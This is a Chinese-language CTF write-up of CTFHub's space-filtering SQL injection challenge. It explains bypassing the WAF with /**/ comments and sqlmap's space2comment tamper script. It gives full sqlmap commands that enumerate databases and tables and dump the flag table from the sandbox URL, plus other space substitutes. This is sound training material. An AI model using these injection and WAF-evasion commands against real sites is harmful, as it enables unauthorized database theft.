【CTFHub】Web-SQL注入过滤空格 Writeup

操作者：何芊宏 | 操作日期：2026.9.25 | 分类：CTF | 标签：CTFHub, Web, SQL注入, 过滤空格, WAF绕过, SQLmap, Burp Suite

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - SQL注入 / 过滤空格
  • 题目名称：过滤空格
  • 环境：通过 Open Browser 打开外部浏览器访问靶场环境。
  • 目标：后端 WAF 过滤了 SQL 语句中的所有空格，直接输入常规 Payload 会触发拦截。需要使用替代字符绕过过滤，最终获取 Flag。

2. 解题思路与知识点

核心原理：SQL 语法要求关键字之间必须有空格分隔（如 union select），当空格被过滤时，会导致语法错误。绕过的方法是用 MySQL 支持的、可代替空格的注释符 /**/ 来替代。

工具与手工的双重思考：
  • 手工路线（Burp Suite）：虽然可以通过手动替换 /**/ 来绕过空格，但在构造长 Payload 时（如查表和查字段），WAF 可能会对特定的关键字组合进行静默拦截，导致页面无报错但数据为空。
  • 工具路线（SQLmap）：最终使用了 SQLmap 的 --tamper "space2comment.py" 插件。该脚本的底层原理正是自动把 SQL 语句中的空格替换为 /**/。配合 --batch 参数，实现了稳定、快速的脱库，有效规避了 WAF 针对特定手工 Payload 的拦截策略。

3. 操作步骤

第一步：SQLmap 自动脱库（推荐，最稳定）

操作命令：在 CMD 中运行（URL 已换为当前环境）：

python sqlmap.py -u "http://challenge-9432ed059e388520.sandbox.ctfhub.com:10800/?id=1" --dbs --tamper "space2comment.py" --batch

执行目的：探测注入点，利用 space2comment 替换空格，获取所有数据库名。

回显结果：成功列出 information_schema、mysql、performance_schema 和 sqli。

获得信息：确认当前库为 sqli。

第二步：获取表名（SQLmap）

操作命令：

python sqlmap.py -u "http://challenge-9432ed059e388520.sandbox.ctfhub.com:10800/?id=1" -D "sqli" --tables --tamper "space2comment.py" --batch

执行目的：查询 sqli 库下的所有表名。

回显结果：输出 news 和随机表名 yjosujyarv。

获得信息：确认目标表名为 yjosujyarv，news 为干扰项。

第三步：一键脱库拿 Flag（SQLmap）

操作命令：

python sqlmap.py -u "http://challenge-9432ed059e388520.sandbox.ctfhub.com:10800/?id=1" -D "sqli" -T "yjosujyarv" --dump --tamper "space2comment.py" --batch --threads=1

执行目的：指定库名和表名，使用 --dump 自动猜测字段名并导出表内数据。

回显结果：终端打印数据表，输出 ctfhub{28e7c86cddcc506dc791d70b}。

获得信息：成功提取 Flag，提交至 CTFHub，通关成功。

4. 踩坑记录与复盘

  • 坑1：WAF 的空格拦截。直接输入带空格的 Payload 会直接被拦截并提示 Hacker!!!，必须使用替代空格。
  • 坑2：SQLmap 的初始误判。不加 --tamper 时，SQLmap 的正常测试请求被 WAF 拦截，导致其误判为“不可注入”。必须指定 --tamper "space2comment.py" 脚本。
  • 坑3：手工 Payload 的局限性。当使用 BP 手工构造长 Payload 时，WAF 可能会对特定关键字组合进行静默拦截，导致状态码 200 但数据为空。这证明了在复杂的 WAF 环境中，自动化工具的灵活性和抗干扰能力优于僵化的手工Payload。
  • 坑4：浏览器地址栏与 BP 抓包混淆。在 BP 的 Repeater 里修改请求时，Payload 是放在 GET /?id=... 里的。切记不要将完整的请求行直接复制到浏览器地址栏，会导致请求格式错误并触发 WAF。

5. 知识总结

  • 空格绕过手段：替代空格的常用符号包括内联注释 /**/、换行符 %0a、制表符 %09 等。
  • SQLmap 核心参数：--tamper 是绕过 WAF 的神器，space2comment 脚本专门解决空格过滤问题。
  • 实战环境认知：工具虽然能大幅提升效率，但在 WAF 静默拦截和自动化绕过方面，往往比手工更聪明。而作为安全研究员，我们需要能够准确判断“是环境坏了”还是“Payload被拦截了”。
